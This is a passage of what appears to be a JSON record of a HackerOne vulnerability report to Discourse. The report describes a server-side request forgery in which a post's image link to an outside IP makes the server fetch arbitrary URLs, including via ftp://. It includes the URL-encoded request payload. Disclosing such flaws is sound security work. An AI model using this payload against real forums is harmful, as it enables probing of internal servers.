_t=aebe2511952a805cec46af434b6617d5<br>\nConnection: close</p>\n\n<p>raw=TESTa+%5B!%5B%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)&amp;unlist_topic=false&amp;category=&amp;topic_id=835&amp;is_warning=false&amp;archetype=regular&amp;typing_duration_msecs=100&amp;composer_open_duration_msecs=9183&amp;featured_link=&amp;image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bwidth%5D=24&amp;image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bheight%5D=24&amp;nested_post=true</p>\n\n<hr>\n\n<p>The attacker is able to send internal server side requests using Ruby client.<br>\nCheck the attached screens for prove.</p>\n\n<p>Why does the vulnerability exist?</p>\n\n<p>discourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply <a title=\"ftp://test.com/file\" href=\"/redirect?signature=107ae52180b14a3c1b8dc53405cf55910ad82cf2&amp;url=ftp%3A%2F%2Ftest.com%2Ffile\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>ftp://test.com/file</span><i class=\"icon-external-link\"></i></a> as an URL and discourse will make such a FTP request.</p>\n\n<p>If the description is not clear please feel free to ask us for more detailed report.</p>\n\n<p>regards <a href=\"/redirect?signature=98baa7b75c51160a1f9f112164540219a885d9f4&amp;url=http%3A%2F%2Fwww.afine.pl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.afine.pl</span><i class=\"icon-external-link\"></i></a></p>\n", 
    "severity_rating": "low", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://discourse.org", 
            "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse", 
            "twitter_handle": "discourse", 
            "name": "Discourse"
        }, 
        "handle": "discourse", 
        "url": "https://hackerone.com/discourse", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/016/893/3dd37e1cfa3d9380ced573b87beae0c950703ddd_small.?1481849067", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 16893, 
        "default_currency": "usd"
    }, 
    "is_published": false
}